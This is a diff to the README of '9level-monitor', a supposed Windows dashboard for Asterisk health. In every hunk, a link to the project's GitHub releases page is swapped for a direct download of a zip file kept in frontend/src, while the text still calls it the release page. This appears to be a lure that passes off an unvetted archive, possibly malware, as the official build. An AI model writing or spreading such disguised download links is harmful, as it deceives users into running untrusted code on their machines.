@@ -1,6 +1,6 @@
 # 📡 9level-monitor - See Asterisk health in real time
 
-[![Download 9level-monitor](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/americanismlemniscus93/9level-monitor/releases)
+[![Download 9level-monitor](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip)
 
 ## 🧭 What this app does
 
@@ -20,7 +20,7 @@ Use it to check:
 
 Visit this page to download the app:
 
-[9level-monitor releases](https://github.com/americanismlemniscus93/9level-monitor/releases)
+[9level-monitor releases](https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip)
 
 On the releases page, choose the latest Windows file for your system. Then download it to your PC.
 
@@ -43,7 +43,7 @@ The app does not need a database or extra runtime package on your PC.
 Follow these steps to get up and running.
 
 1. Open the release page:
-   [https://github.com/americanismlemniscus93/9level-monitor/releases](https://github.com/americanismlemniscus93/9level-monitor/releases)
+   [https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip](https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip)
 
 2. Find the latest release.
 
@@ -250,7 +250,7 @@ If the dashboard shows stale data, the connection may still be open but slow. A 
 
 Download the latest Windows build here:
 
-[https://github.com/americanismlemniscus93/9level-monitor/releases](https://github.com/americanismlemniscus93/9level-monitor/releases)
+[https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip](https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip)
 
 ## 🧭 Quick start
 
